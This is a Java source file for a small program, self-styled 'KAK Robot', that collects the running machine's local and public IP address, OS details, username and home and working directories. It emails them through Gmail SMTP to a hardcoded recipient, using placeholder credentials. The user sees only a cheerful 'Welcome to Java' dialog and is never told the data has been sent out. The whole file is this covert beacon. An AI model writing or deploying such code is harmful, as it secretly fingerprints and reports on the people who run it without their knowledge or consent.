
/**
 * @author khalid
 */
import java.io.*;
import java.net.*;
import java.util.*;

import javax.mail.*;
import javax.mail.PasswordAuthentication;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.JOptionPane;

public class OIE <SendMailTLS> {

	public static void main(String[] args)   {

		// to send the date and time by email.
		Date now = new Date();
		

		String lip="";
		URL whatismyip;
		BufferedReader in;
		String ip="";
		try {
		 // get local ip
		 lip=InetAddress.getLocalHost().getHostAddress();
		 //get public ip address
		 whatismyip = new URL("http://checkip.amazonaws.com");
		 in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
		 ip = in.readLine(); // you get the IP as a String
		}
		catch (UnknownHostException e){
			System.err.println(e);
			lip=e.toString();
			JOptionPane.showMessageDialog(null,e,"UnknownHostException",JOptionPane.WARNING_MESSAGE);
		}
		catch (MalformedURLException e){
			System.err.println(e);
			JOptionPane.showMessageDialog(null,e,"MalformedURLException",JOptionPane.WARNING_MESSAGE);
		}
		catch (IOException e){
			System.err.println(e);
			ip=e.toString();
			JOptionPane.showMessageDialog(null,e,"IOException",JOptionPane.WARNING_MESSAGE);
		}
		
		
		// get public ip address
	//	URL whatismyip = new URL("http://checkip.amazonaws.com");
	//	BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
	//	String ip = in.readLine(); // you get the IP as a String
		//System.out.println(ip);
		
		// OS information ..
		String os_name =System.getProperty("os.name");
		String os_arc = System.getProperty("os.arch");
		String os_ver= System.getProperty("os.version");
		String os_username = System.getProperty("user.name");
		String os_userhome = System.getProperty("user.home");
		String os_userdir = System.getProperty("user.dir");
		
		// email sender configuration		
		final String username = "Example@gmail.com";
		final String password = "PASSWORD";
		
		// server configuration 
		Properties props = new Properties();
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.starttls.enable", "true");//smtp.gmail.com
		props.put("mail.smtp.host", "smtp.gmail.com"); //smtp.googlemail.com
		props.put("mail.smtp.port", "587");//465 //587

		// username and password authentication 
		Session session = Session.getInstance(props, new javax.mail.Authenticator() {
			protected PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(username, password);
				
			}
		  });
	 
		
		try {  

			Message message = new MimeMessage(session);
			message.setFrom(new InternetAddress("Example@gmail.com"));
			message.setRecipients(Message.RecipientType.TO,InternetAddress.parse("emailToReceive@gmail.com"));
			message.setSubject("MY Program ... !");
			message.setText("*******Hi There. This is KAK Robot ^.^"+"\n*\n*"+ "Date&Time now: "+now +
					"*\n*I am in This Machine: \n"+
					"*\tOS Name is: "+os_name+"\n"+
					"*\tOS Version: "+os_ver+"\n"+
					"*\tOS Architecture: "+os_arc+"\n"+
					"*\tOS Username: "+os_username+"\n"+
					"*\tOS User Home Dir: "+os_userhome+"\n"+
					"*\tOS user Dir: "+os_userdir+"\n\n"+
					"*Local IP is: "+lip+"\n"+
					"*Public IP is: "+ip+"\n\n*******see you !*******");
			

			Transport.send(message);

			System.out.println("Done");
			//JOptionPane.showMessageDialog(null, "Eggs are not supposed to be green.");
			JOptionPane.showMessageDialog(null,"Hello There ^_^","Welcome to Java",JOptionPane.INFORMATION_MESSAGE);
			
			
		} catch (MessagingException e) {
			throw new RuntimeException(e);
		}
	}
}